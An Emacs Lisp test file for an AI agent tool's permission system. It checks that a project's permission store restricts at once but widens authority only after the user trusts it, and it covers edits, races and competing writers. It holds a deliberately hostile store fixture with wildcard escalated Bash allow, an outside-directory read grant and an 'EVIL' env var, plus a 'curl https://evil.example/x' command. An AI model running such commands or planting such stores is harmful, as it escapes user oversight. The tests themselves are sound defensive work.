;;; test-niwa-permission-project-trust.el --- Project permission store trust -*- lexical-binding: t; -*-

;;; Commentary:
;; A project's `.niwa/permissions.eld' restricts at once but widens authority
;; only after the user trusts its current content.

;;; Code:

(require 'helpers
         (file-name-concat
          (file-name-directory
           (or buffer-file-name load-file-name byte-compile-current-file))
          "helpers"))
(require 'niwa)
(require 'niwa-hooks)
(require 'niwa-permission-mode)
(require 'niwa-permission-persistence)
(require 'niwa-session-artifacts)
(require 'niwa-session-control-fs)
(require 'niwa-tool-exec-permission)
(require 'niwa-tool-permission)
(require 'niwa-view)

(defmacro niwa-permission-project-trust-test--with-workspace (&rest body)
  "Run BODY with a session data buffer over a temporary project.
Binds `root', `outside', `workspace', `store' and `warnings', the
`display-warning' texts emitted so far.  Ask mode, no defcustom rules."
  (declare (indent 0) (debug t))
  `(let* ((root (file-name-as-directory (make-temp-file "niwa-proj-trust-" t)))
          (outside (file-name-as-directory
                    (make-temp-file "niwa-proj-trust-outside-" t)))
          (workspace (niwa-workspace--create
                      :type 'project :id root :root root :name "trust"))
          (session (niwa-session-create "trust" workspace root))
          (store (niwa-permission-persistence-file workspace 'workspace))
          (warnings nil))
     (unwind-protect
         (niwa-test--with-captured-diagnostics nil
           (cl-letf (((symbol-function 'display-warning)
                      (lambda (_type message &rest _)
                        (setq warnings (append warnings (list message))))))
             (dolist (file '("plain.txt" "denied.txt" "asked.txt"))
               (with-temp-file (file-name-concat root file) (insert "x\n")))
             (with-temp-file (file-name-concat outside "secret.txt")
               (insert "x\n"))
             (make-directory (file-name-directory store) t)
             (setf (niwa-session-permission-mode session) 'ask)
             (niwa-view-test--with-buffers
               (with-current-buffer data-buf
                 (setq-local niwa--workspace workspace
                             niwa--session session
                             default-directory root
                             niwa-permission-rules nil
                             niwa-protected-paths nil)
                 ,@body))))
       (delete-directory root t)
       (delete-directory outside t))))

(defun niwa-permission-project-trust-test--write (store form)
  "Write FORM to permission STORE by hand, then refresh as a tool call does."
  (with-temp-file store (prin1 form (current-buffer)))
  (niwa-permission-validate-persistent-stores niwa--workspace))

(defun niwa-permission-project-trust-test--decisions (root outside)
  "Return the real permission decisions under ROOT and OUTSIDE as a plist."
  (niwa-permission-validate-persistent-stores niwa--workspace)
  (list
   :bash (niwa-tool-permission-decide-now
          "Bash" (list :command "make deploy" :description "Deploy"))
   :grants (length (niwa-permission-persistence-load-resource-grants
                    niwa--workspace))
   :denied (niwa-tool-permission-decide-now
            "Read" (list :file_path (file-name-concat root "denied.txt")))
   :asked (niwa-tool-permission-decide-now
           "Read" (list :file_path (file-name-concat root "asked.txt")))
   :plain (niwa-tool-permission-decide-now
           "Read" (list :file_path (file-name-concat root "plain.txt")))
   :escalation (niwa-tool-exec-permission-full-escalation-rule-decision
                "Bash" "curl https://evil.example/x"
                (niwa-permission-rules-collect-buckets
                 nil nil nil
                 (niwa-permission-persistence-load-rules niwa--workspace))
                'require-escalated)
   :safe-env (niwa-permission-persistence-load-safe-env-vars niwa--workspace)))

(defun niwa-permission-project-trust-test--store (root outside &optional extra)
  "Return a hostile project store form for ROOT and OUTSIDE.
EXTRA rules are appended, to change the file's content."
  `(:rules (("Bash" :pattern "make deploy" :action allow)
            ("Read" :path ,(file-name-concat root "denied.txt") :action deny)
            ("Read" :path ,(file-name-concat root "asked.txt") :action ask)
            ("Bash" :pattern "*" :sandbox-permissions require-escalated
             :action allow)
            ,@extra)
    :resource-grants ((:path ,outside :access read :recursive t))
    :safe-env-vars ("EVIL")))

(defun niwa-permission-project-trust-test--edit-after-reads (store edits thunk)
  "Call THUNK, running the next of EDITS right after each read of STORE.
This is an outside writer landing between niwa's read and its write."
  (let ((read (symbol-function 'niwa-permission--read-store-file-uncached)))
    (cl-letf (((symbol-function 'niwa-permission--read-store-file-uncached)
               (lambda (file &rest args)
                 (prog1 (apply read file args)
                   (when (and edits (equal (expand-file-name file)
                                           (expand-file-name store)))
                     (funcall (pop edits)))))))
      (funcall thunk))))

(niwa-deftest niwa-permission-persistent-authority/project-trust
  (:doc "restricts at once, widens only after trust, and forgets trust on edit")
  (niwa-permission-project-trust-test--with-workspace
    (let ((untrusted '(:bash ask :grants 0 :denied deny :asked ask
                       :plain allow :escalation nil :safe-env nil)))
      (ert-info ("Control: without a store nothing is granted or restricted")
        (should (equal '(:bash ask :grants 0 :denied allow :asked allow
                         :plain allow :escalation nil :safe-env nil)
                       (niwa-permission-project-trust-test--decisions
                        root outside))))
      (niwa-permission-project-trust-test--write
       store (niwa-permission-project-trust-test--store root outside))
      (ert-info ("Untrusted: deny and ask apply, allow authority is ignored")
        (should (equal untrusted (niwa-permission-project-trust-test--decisions
                                  root outside)))
        ;; Asked again: still one notice for this content.
        (niwa-permission-project-trust-test--decisions root outside)
        (should (= 1 (length warnings)))
        (should (string-search store (car warnings)))
        (should (string-search "niwa-hooks-trust-project" (car warnings))))
      (niwa-hooks-trust-project workspace)
      (ert-info ("Trusted: the store's full authority applies, silently")
        (should (equal `(:bash allow :grants 1 :denied deny :asked ask
                         :plain allow :escalation allow :safe-env ("EVIL"))
                       (niwa-permission-project-trust-test--decisions
                        root outside)))
        (should (= 1 (length warnings))))
      (niwa-permission-project-trust-test--write
       store (niwa-permission-project-trust-test--store
              root outside '(("Grep" :action deny))))
      (ert-info ("Edited: ignored again, with a new notice, until re-trusted")
        (should (equal untrusted (niwa-permission-project-trust-test--decisions
                                  root outside)))
        (should (= 2 (length warnings))))
      (niwa-hooks-trust-project workspace)
      (should (eq 'allow (plist-get (niwa-permission-project-trust-test--decisions
                                     root outside)
                                    :bash))))))

(niwa-deftest niwa-permission-persistent-authority/project-trust-off
  (:doc "follows `niwa-hooks-require-project-trust' like project hooks")
  (niwa-permission-project-trust-test--with-workspace
    (let ((niwa-hooks-require-project-trust nil))
      (niwa-permission-project-trust-test--write
       store (niwa-permission-project-trust-test--store root outside))
      (should (eq 'allow (plist-get (niwa-permission-project-trust-test--decisions
                                     root outside)
                                    :bash)))
      (should-not warnings))))

(niwa-deftest niwa-permission-persistence-save-rule/project-trust
  (:doc "keeps trust across niwa's own writes without laundering untrusted content")
  (niwa-permission-project-trust-test--with-workspace
    (let ((rule '("Bash" :pattern "make deploy" :action allow)))
      (ert-info ("A store niwa creates for the user is trusted")
        (niwa-permission-persistence-save-rule workspace rule)
        (should (eq 'allow (plist-get (niwa-permission-project-trust-test--decisions
                                       root outside)
                                      :bash))))
      (ert-info ("A trusted store stays trusted after niwa writes and revokes")
        (niwa-permission-persistence-save-resource-grant workspace outside 'read t)
        (should (= 1 (plist-get (niwa-permission-project-trust-test--decisions
                                 root outside)
                                :grants)))
        (niwa-permission-remove-persistent-resource-grant
         workspace 'workspace outside 'read t)
        (should (eq 'allow (plist-get (niwa-permission-project-trust-test--decisions
                                       root outside)
                                      :bash))))
      (should-not warnings)
      (ert-info ("A user approval does not launder an untrusted store")
        (niwa-permission-project-trust-test--write
         store (niwa-permission-project-trust-test--store root outside))
        (niwa-permission-persistence-save-rule
         workspace '("Glob" :action allow))
        (should (eq 'ask (plist-get (niwa-permission-project-trust-test--decisions
                                     root outside)
                                    :bash)))))))

(niwa-deftest niwa-permission-persistence-save-rule/project-trust-race
  (:doc "conditions niwa's write on the bytes it read and decides trust from them")
  (niwa-permission-project-trust-test--with-workspace
    (let ((hostile (niwa-permission-project-trust-test--store root outside))
          (user-rule '("Bash" :pattern "make test" :action allow)))
      (cl-flet ((decide (command)
                  (niwa-permission-validate-persistent-stores workspace)
                  (niwa-tool-permission-decide-now
                   "Bash" (list :command command :description "Run"))))
        (ert-info ("An untrusted store removed mid-update is not signed")
          (niwa-permission-project-trust-test--write store hostile)
          (niwa-permission-project-trust-test--edit-after-reads
           store (list (lambda () (delete-file store)))
           (lambda () (niwa-permission-persistence-save-rule workspace user-rule)))
          (should (eq 'allow (decide "make test")))
          (should (eq 'ask (decide "make deploy"))))
        (ert-info ("A concurrent restrictive edit is not overwritten")
          (niwa-permission-project-trust-test--edit-after-reads
           store
           (list (lambda ()
                   (with-temp-file store
                     (prin1 `(:rules (,user-rule ("Bash" :pattern "make test"
                                                  :action deny))
                              :resource-grants nil)
                            (current-buffer)))))
           (lambda ()
             (niwa-permission-persistence-save-rule
              workspace '("Bash" :pattern "make lint" :action allow))))
          (should (eq 'deny (decide "make test")))
          ;; The retried write kept the outside edit, which is untrusted, so
          ;; niwa does not sign it together with the user's rule.
          (should (eq 'ask (decide "make lint"))))
        (ert-info ("An update that keeps losing the race stops and says so")
          (let ((count 0))
            (should-error
             (niwa-permission-project-trust-test--edit-after-reads
              store
              (make-list 5 (lambda ()
                             (with-temp-file store
                               (prin1 `(:rules (("Grep" :pattern
                                                 ,(format "%d" (cl-incf count))
                                                 :action deny))
                                        :resource-grants nil)
                                      (current-buffer)))))
              (lambda ()
                (niwa-permission-persistence-save-rule
                 workspace '("Bash" :pattern "make docs" :action allow))))
             :type 'user-error)
            (should (eq 'ask (decide "make docs")))))))))

(niwa-deftest niwa-permission-persistence-save-rule/competing-writer
  (:doc "serializes niwa writers on the state directory lock across proof and write")
  (niwa-permission-project-trust-test--with-workspace
    (skip-unless (executable-find "flock"))
    (let* ((directory (directory-file-name (file-name-directory store)))
           (held (file-name-concat root "held"))
           (other `(:rules (("Bash" :pattern "make a" :action allow)
                            ("Bash" :pattern "make b" :action deny))
                    :resource-grants nil))
           (other-text (prin1-to-string other))
           process)
      (unwind-protect
          (progn
            (niwa-permission-persistence-save-rule
             workspace '("Bash" :pattern "make a" :action allow))
            (niwa-permission-project-trust-test--edit-after-reads
             store
             (list
              (lambda ()
                ;; Another writer has verified the bytes niwa just read and
                ;; now holds the lock until its own write lands.
                (setq process
                      (make-process
                       :name "niwa-competing-writer" :noquery t
                       :command
                       (list "flock" directory "sh" "-c"
                             "touch \"$1\"; sleep 1; printf %s \"$2\" > \"$3\""
                             "sh" held other-text store)))
                (with-timeout (10 (ert-fail "Competing writer never held the lock"))
                  (while (not (file-exists-p held))
                    (accept-process-output nil 0.02)))))
             (lambda ()
               (niwa-permission-persistence-save-rule
                workspace '("Bash" :pattern "make c" :action allow))))
            (with-timeout (10 (ert-fail "Competing writer did not finish"))
              (while (process-live-p process)
                (accept-process-output process 0.05)))
            (let ((rules (plist-get (niwa-permission--editable-status store)
                                    :store)))
              (ert-info ("Neither writer's change is lost")
                (should (member '("Bash" :pattern "make b" :action deny)
                                (plist-get rules :rules)))
                (should (member '("Bash" :pattern "make c" :action allow)
                                (plist-get rules :rules))))))
        (when (process-live-p process) (delete-process process))))))

(niwa-deftest niwa-permission-persistence-write-store/remote-precondition
  (:doc "publishes a remote store only after proving the bytes it replaces")
  (niwa-permission-project-trust-test--with-workspace
    (let (published programs status)
      (cl-letf (((symbol-function 'file-remote-p)
                 (lambda (file &rest _) (equal file store)))
                ((symbol-function 'niwa-permission-mode-data-buffer)
                 (lambda () data-buf))
                ((symbol-function 'niwa-session-publication-active-p) #'ignore)
                ((symbol-function 'niwa-session-control-fs-run-program)
                 (lambda (operations &rest _)
                   (push operations programs)
                   (list (list :status status))))
                ((symbol-function 'niwa-session-artifacts-publish-text)
                 (lambda (_session file content &rest _)
                   (push (cons file content) published))))
        (ert-info ("A changed file publishes nothing")
          (setq status 'mismatch)
          (should-not (niwa-permission-persistence-write-store
                       store '(:rules nil :resource-grants nil) nil nil
                       (make-string 64 ?a)))
          (should-not published)
          (should (equal (make-string 64 ?a)
                         (plist-get (car (car programs)) :content))))
        (ert-info ("An unchanged absent file is published and its hash returned")
          (setq status 'ok)
          (let ((hash (niwa-permission-persistence-write-store
                       store '(:rules nil :resource-grants nil) nil nil
                       'missing)))
            (should (equal (plist-get (car (car programs)) :content) nil))
            (should (= 1 (length published)))
            (should (equal hash (secure-hash
                                 'sha256 (encode-coding-string
                                          (cdar published) 'utf-8-unix))))))))))

(provide 'test-niwa-permission-project-trust)
;;; test-niwa-permission-project-trust.el ends here
